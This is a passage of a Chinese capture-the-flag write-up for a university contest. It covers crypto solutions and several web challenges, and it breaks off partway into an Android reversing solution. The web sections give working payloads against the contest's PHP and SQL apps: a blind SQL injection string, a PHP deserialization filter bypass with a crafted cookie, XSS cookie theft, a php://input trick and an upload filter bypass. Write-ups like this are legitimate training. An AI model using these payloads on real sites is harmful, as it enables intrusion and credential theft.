+0000001B 00000004
+00000005 00000000
+0000000B 0000003F
+0000004D 0000002C
+0000000F 00000033
+00000003 00000003
+0000001F 00000010
+00000010 0000001C
+00000007 00000002
+00000002 00000008
+00000042 0000004F
+0000002A 00000013
+00000037 00000001
+00000001 0000000F
+00000006 00000008
+00000010 00000002
+00000002 00000000
+00000005 00000025
+00000029 0000001A
+00000007 0000001A
+00000001 00000001
+00000028 0000000C
+00000011 00000021
+00000007 00000007
+00000002 0000000D
+00000051 00000053
+00000033 00000010
+00000036 00000001
+00000001 00000023
+0000000C 00000011
+00000020 00000006
+00000006 00000001
+0000000C 0000004C
+00000052 00000032
+0000000F 00000035
+00000002 00000002
+00000018 00000008
+0000000B 00000015
+00000004 00000004
+00000001 00000008
+00000033 00000036
+00000021 0000000A
+00000023 00000001
+00000001 0000001E
+0000000E 0000000D
+00000019 00000007
+00000002 00000002
+00000007 0000003D
+00000046 00000026
+00000012 00000031
+00000000 00000000
+00000020 0000000E
+00000010 0000001C
+00000007 00000003
+00000002 00000008
+00000044 0000004D
+0000002C 00000012
+00000035 00000000
+00000002 0000001D
+0000000F 0000000F
+0000001B 00000007
+00000005 00000001
+0000000A 00000040
+0000004E 0000002A
+00000012 00000036
+00000002 00000003
+00000020 0000000E
+00000011 0000001C
+00000007 00000003
+00000002 00000008
+00000044 0000004D
+0000002C 00000012
+00000035 00000000
+00000003 00008ED1
+00008921 00007CD8
+0000570C 00005D87
+00007B78 0000800E
+0000428D 00009065
+00008A65 00005BCF
+00007343 00007FB0
+00007F03 00008055
+00000000 00000000
+00000000 00000000
+00000000 00000000
+00000000 00000000
+00000000 00000000
+00000000 00000000
+00000000 00000000
+00000000 00000000
+00000000 00000000
+00000000 00000000
+00000000 00000000
+00000000 00000000
+00000000 00000000
+00000000 00000000
+00000000 00000000
+00000000 00000000
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br><span class="line-number">90</span><br><span class="line-number">91</span><br><span class="line-number">92</span><br><span class="line-number">93</span><br><span class="line-number">94</span><br><span class="line-number">95</span><br><span class="line-number">96</span><br><span class="line-number">97</span><br><span class="line-number">98</span><br><span class="line-number">99</span><br><span class="line-number">100</span><br><span class="line-number">101</span><br><span class="line-number">102</span><br><span class="line-number">103</span><br><span class="line-number">104</span><br><span class="line-number">105</span><br><span class="line-number">106</span><br><span class="line-number">107</span><br><span class="line-number">108</span><br><span class="line-number">109</span><br><span class="line-number">110</span><br><span class="line-number">111</span><br><span class="line-number">112</span><br><span class="line-number">113</span><br><span class="line-number">114</span><br><span class="line-number">115</span><br><span class="line-number">116</span><br><span class="line-number">117</span><br><span class="line-number">118</span><br><span class="line-number">119</span><br><span class="line-number">120</span><br><span class="line-number">121</span><br><span class="line-number">122</span><br><span class="line-number">123</span><br><span class="line-number">124</span><br><span class="line-number">125</span><br><span class="line-number">126</span><br><span class="line-number">127</span><br><span class="line-number">128</span><br><span class="line-number">129</span><br><span class="line-number">130</span><br><span class="line-number">131</span><br><span class="line-number">132</span><br><span class="line-number">133</span><br><span class="line-number">134</span><br><span class="line-number">135</span><br><span class="line-number">136</span><br><span class="line-number">137</span><br><span class="line-number">138</span><br><span class="line-number">139</span><br><span class="line-number">140</span><br><span class="line-number">141</span><br><span class="line-number">142</span><br><span class="line-number">143</span><br><span class="line-number">144</span><br><span class="line-number">145</span><br><span class="line-number">146</span><br><span class="line-number">147</span><br><span class="line-number">148</span><br><span class="line-number">149</span><br><span class="line-number">150</span><br><span class="line-number">151</span><br><span class="line-number">152</span><br><span class="line-number">153</span><br><span class="line-number">154</span><br><span class="line-number">155</span><br><span class="line-number">156</span><br><span class="line-number">157</span><br><span class="line-number">158</span><br><span class="line-number">159</span><br><span class="line-number">160</span><br><span class="line-number">161</span><br><span class="line-number">162</span><br><span class="line-number">163</span><br><span class="line-number">164</span><br><span class="line-number">165</span><br><span class="line-number">166</span><br><span class="line-number">167</span><br><span class="line-number">168</span><br><span class="line-number">169</span><br><span class="line-number">170</span><br><span class="line-number">171</span><br><span class="line-number">172</span><br><span class="line-number">173</span><br><span class="line-number">174</span><br><span class="line-number">175</span><br><span class="line-number">176</span><br></div></div><p>显然是一个ARM汇编，但是鄙人不懂ARM平台汇编。更不用说直接给机器码和数据了。（学长够狠的，一个LSB出成这样。。。）</p> <h2 id="crypto"><a href="#crypto" class="header-anchor">#</a> CRYPTO</h2> <h3 id="base"><a href="#base" class="header-anchor">#</a> Base</h3> <p>都说是base了，先将hex转成text，再base64解密</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code>54553479567A493152455250556C524956314655516B394E576C593257564E4254303554566A5A4F56454A48566C4E594D6A303950513D3D
+-<span class="token operator">&gt;</span> <span class="token assign-left variable">TU4yVzI1RERPUlRIV1FUQk9NWlY2WVNBT05TVjZOVEJHVlNYMj09PQ</span><span class="token operator">==</span>
+-<span class="token operator">&gt;</span> <span class="token assign-left variable">MN2W25DDORTHWQTBOMZV6YSAONSV6NTBGVSX2</span><span class="token operator">==</span><span class="token operator">=</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>最后出现3个=，应该不是base64了，推测是base32</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code><span class="token assign-left variable">MN2W25DDORTHWQTBOMZV6YSAONSV6NTBGVSX2</span><span class="token operator">==</span><span class="token operator">=</span>
+-<span class="token operator">&gt;</span> cumtctf<span class="token punctuation">{</span>Bas3_b@se_6a5e<span class="token punctuation">}</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h3 id="我都不好意思说这是加密"><a href="#我都不好意思说这是加密" class="header-anchor">#</a> 我都不好意思说这是加密</h3> <p>密文最后有6个等号，肯定不是base64了，是base32</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code><span class="token assign-left variable">OFQXC5DTM5PWG6LSMJPWQ2LINB5W63LLMZPWG43XPU</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
+-<span class="token operator">&gt;</span> qaqtsg_cyrb_hihh<span class="token punctuation">{</span>omkf_csw<span class="token punctuation">}</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>这又是常见的套路。一般就是栅栏，凯撒，最多还有ROT13这几个混着用。。。</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code>qaqtsg_cyrb_hihh<span class="token punctuation">{</span>omkf_csw<span class="token punctuation">}</span>
+-<span class="token operator">&gt;</span> qiahqht<span class="token punctuation">{</span>sogm_kcfy_rcbs_wh<span class="token punctuation">}</span>
+-<span class="token operator">&gt;</span> cumtctf<span class="token punctuation">{</span>easy_work_done_it<span class="token punctuation">}</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><h3 id="超超超简单的rsa"><a href="#超超超简单的rsa" class="header-anchor">#</a> 超超超简单的RSA</h3> <p>题目很明显给出了rsa的攻击，打开文件发现两个txt文档，打开任意一个文档发现里面均存在有n 与 e，所以知道本题目是两个rsa文件（即两个被加密的文件），所以想办法得到每个文件的私钥才可以解题。对第一个A文本中的n用质数分解发现分解不出来（对了，我不懂16进制怎么去处理，所以用py全部转成10进制了，花了一些时间。。。。）所以很复杂。想了好久猜想两个文本A与B中的N也许有联系，所以用py处理了一下两个质数得出了他们的最大公约数，所以以这个公约数C作为P，即得出Q=N/P。有P有Q然后用小工具（下图）得出私钥D。</p> <p>之后有私钥利用A文本里给的公钥与小工具,将密文等数据填写进去得到
+即明文得出来了。不过B文件的内容我没有去尝试解，大家可以去解下试试。</p> <p>模数
+N=29418132766062200053827508724246843105374637443595563658353636901180985530454564748758954022059769968982002140853896779902444989762754829021500174009685317744797202131791952882245156752602275951380571602331788950944361654561540811865247443070852205987517914882270234145588910167329180689201693364463939325045996426086956404110646487321752453515607959864012257125599952218384912758492278760212475418527633763779623723297398616758881690569134708160861225121310386258262233845349929832236096958219199090596331413929196303615488618826471077896979729621018914864133480510063685383380281751344618122905355446455152052146107</p> <p>私钥D=5276569622169127583335396030174609377842679457826382876886732018555136943898524693377979534161711823815512184943455864784707258401816484897185891483275856469930223821580727295178409526710404020255132334411694676322006535535546302259515681376235707488042647120486202926845339494431016269464963898657451334903848837250871373477682894250164643619602539540167941126569254100541247071088029518267294673136150590137761627750871598184521964595130415894447450203665799780203794291800387632230796502586420060307704968798926230993933417456137261862838342423360539764609700124237130276870839075369086314306378124788811184527308864016188670758147951657948794726339811014447072181868238689002340820729878182691215125098872623119560093174867103561051579057</p> <p>密文=16100055693360522322921904559463506095804777561229411389210562116776123887118032506500785234735650863266120870039583905903640748310769171758726776231272365756600955133373377424528798613667972612939112952739492634777392213118214538310023716791113397548161112585724810411650439986941834109983323315567262092245187889800878232402966804760965881216269022049586892968822789422135384021734622276346902887808132752808716548024992278042957487218505559297871159990210141047554025964806293617142183951888549982800751775892257499574146183538611011708642419473426914866890982026974237403676735705451473230887885053941067076232393
+公钥e=0x10001</p> <p>此外，根据A和B文本得到的最大公约数Q=176619317803996218465829943540526296076867590914430196106340551568870328156449028441778892112662362916940116161090362718242443676528799588976770654437504474997568793583909264900680213577430229171890593572386841798207200784823655954364900051437142324539709060542879468781584230692448457677803389650254712030259</p> <p>P=166562373424571003644969210886957594935507861087984296297058666148455412078457690109851370986660882279126361524191566223822671452404569269819830903808012097953053534590353386995492143954050309296677311577678675327620326594657482392410288368865181591208513290907483245868756146614333721689500461074105692470873</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code>cumtctf<span class="token punctuation">{</span>GCD_is_Useful_in_Rsa<span class="token punctuation">}</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="web"><a href="#web" class="header-anchor">#</a> WEB</h2> <h3 id="暴打出题人"><a href="#暴打出题人" class="header-anchor">#</a> 暴打出题人</h3> <p>上来给了一个留言板,然后提示用XSS平台.网上找了一个XSS平台,通过最简单的使用得到了cookie。在最开始的留言板的页面加入XSS平台得到的cookie即得flag。</p> <h3 id="just-trick"><a href="#just-trick" class="header-anchor">#</a> just trick</h3> <p>这个题涉及到几个小技巧</p> <ol><li>首先进入页面查看源代码得到的提示,然后打开这个文本得到代码。</li></ol> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;!--index.txt--&gt;&quot;</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Location: index.php?id=1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>
+  <span class="token punctuation">{</span>
+      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+      <span class="token punctuation">{</span>
+        <span class="token variable">$key</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token variable">$token</span> <span class="token operator">=</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'r'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token double-quoted-string string">&quot;I want flag!!!&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+          <span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;hello Hacker!&lt;br&gt;&quot;</span><span class="token punctuation">;</span>
+          <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;include.php&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+          <span class="token keyword">echo</span> <span class="token function">cumtctf_unserialize</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">else</span>
+        <span class="token punctuation">{</span>  
+          <span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;You are not Hacker ! &quot;</span><span class="token punctuation">;</span>  
+        <span class="token punctuation">}</span>  
+      <span class="token punctuation">}</span>
+  <span class="token punctuation">}</span>
+<span class="token delimiter important">?&gt;</span></span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br></div></div><ol start="2"><li>PHP中可以看到首先get方式提交一个id的值,在if(!$_GET['id'])的地方需要值不为空跳过if,后面if($id==0)的地方需要id的值为0进入if,如果id=0第一个if语句无法跳过,所以让id='0'这两个地方就都能过去.</li> <li>看到需要get方式提交一个key.想让file_get_contents($key,'r')===&quot;I want flag!!!&quot;可以用PHP的封装协议php://input,它可以得到原始的POST数据.</li> <li>这里我想了好久怎么才能看到include.php的内容= =,也没有文件包含什么的,最后发现和看index.php一下,看一下include.txt就得到了内容。</li></ol> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;!--include.txt--&gt;&quot;</span><span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name">Read</span><span class="token punctuation">{</span><span class="token comment">//flag.php</span>
+    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;flag.php&quot;</span><span class="token operator">===</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">file</span><span class="token operator">||</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">file</span><span class="token punctuation">,</span><span class="token double-quoted-string string">&quot;://&quot;</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
+            <span class="token punctuation">{</span>
+                <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+            <span class="token punctuation">}</span>
+            <span class="token keyword">else</span>
+            <span class="token punctuation">{</span>
+                <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>              
+        <span class="token punctuation">}</span>
+        <span class="token keyword">return</span> <span class="token double-quoted-string string">&quot;you are big Hacker&quot;</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">function</span> <span class="token function">cumtctf_unserialize</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/[oc]:\d+:/i'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">,</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">return</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+<span class="token delimiter important">?&gt;</span></span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br></div></div><ol start="5"><li>最后就是读flag.php的内容了,这里可以通过反序列化去读,但是有两个过滤,一个是过滤了协议的使用,php://filter/convert.base64-encode/resource=flag.php就不能用了,因为不是严格的查找字符串所以./flag.php,后面还有一个对于你传入的序列化字符串有一个正则的过滤,PHP序列化字符串中对象长度前加一个+号仍可正常反序列化,可用此来绕过正则.将这个的序列化字符串作为cookie里面token的值提交得flag.</li></ol> <h3 id="textwall"><a href="#textwall" class="header-anchor">#</a> TextWall</h3> <p>进去随便提交了一个东西然后看到有一个lists的cookie,其中值为24c5889e00902d6bcc65073f0e91ea30bbe203c2 a:1:{i:0;s:9:&quot;hiehiehie&quot;;},字符串前一段为后一段序列化字符串的SHA1.一般构造反序列化一般都需要源码，所以找到了源码泄露点：http://textwall.bxsteam.xyz/.index.php.swo。</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$lists</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">Class</span> filelist<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'hiehiehie.txt'</span><span class="token punctuation">,</span> <span class="token boolean constant">true</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">,</span> <span class="token boolean constant">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token delimiter important">?&gt;</span></span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>构造序列化的串（反序列化后是一个filelist类，$sorce值是我们想查找的路径，这样在反序列化后）这里我们构造如下:</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">filelist</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$b</span><span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">filelist</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'index.php'</span><span class="token punctuation">;</span>
+<span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token operator">=</span><span class="token variable">$b</span><span class="token punctuation">;</span>
+<span class="token variable">$d</span><span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$e</span><span class="token operator">=</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$d</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;&lt;br&gt;&quot;</span><span class="token punctuation">;</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>得到16d8c3c46653e89932859dd7a2eb12fa59df777aO%3A8%3A%22filelist%22%3A1%3A%7Bs%3A6%3A%22source%22%3BO%3A8%3A%22filelist%22%3A1%3A%7Bs%3A6%3A%22source%22%3Bs%3A9%3A%22index.php%22%3B%7D%7D作为cookie提交得到源码(贴部分):</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code>233333333333333333333333333333333333333333333333333333333333333333 <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token comment">//flag in Fl4444444444g.php</span>
+<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$lists</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">Class</span> filelist<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+</span></code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>在上面的过程中将路径改为Fl4444444444g.php,读取即得到flag.</p> <h3 id="简单的盲注"><a href="#简单的盲注" class="header-anchor">#</a> 简单的盲注</h3> <p>这个题第一个hint是请关注图片,抓包发现是get请求发送图片对应的id来获取图片,这里id就是注入点,当id=1&quot;的时候会报错,说明sql语句中使用的是&quot;,接下来就是盲注密码,构造的为id=1&quot;and ord(mid((password),1,1))&lt;48#,跑出来密码为8211d7b4ba2828919651,是DEDECMS的20位MD5加密,账号admin然后登陆进去一个上传文件的地方.<br>
+文件后缀是白名单过滤,我查了好久都没有结果,后来得知是phps后缀(不知道在哪里找的这种后缀...),然后还是传不上去是因为有关于PHP标识的过滤,改为比较不常见的脚本类型<script language="php"></script>可以绕过。(开始时候我把language拼错了导致半天没过...)。</p> <h2 id="mobile"><a href="#mobile" class="header-anchor">#</a> MOBILE</h2> <h3 id="多谢款待"><a href="#多谢款待" class="header-anchor">#</a> 多谢款待</h3> <p>这题很坑，因为我android版本的原因，这个APK运行不了。而且很奇怪，是因为加保护了，还是其他原因，用Android_Killer无法反编译。无奈之下，用APKtools，对Main先转dex，再转java。直接看源码。。但是也很奇怪，这样转出来的string，都是十六进制的数字，不是ascii表示，也不是其他的。什么编码，卡在这里半天。。。后来学长指点说用Jeb可以看。于是我就去下载了。之后进行反编译。以下是伪Java代码。</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token keyword">private</span> <span class="token keyword">boolean</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token class-name">String</span> arg10<span class="token punctuation">,</span> <span class="token keyword">int</span> arg11<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">int</span> v0<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token number">125</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
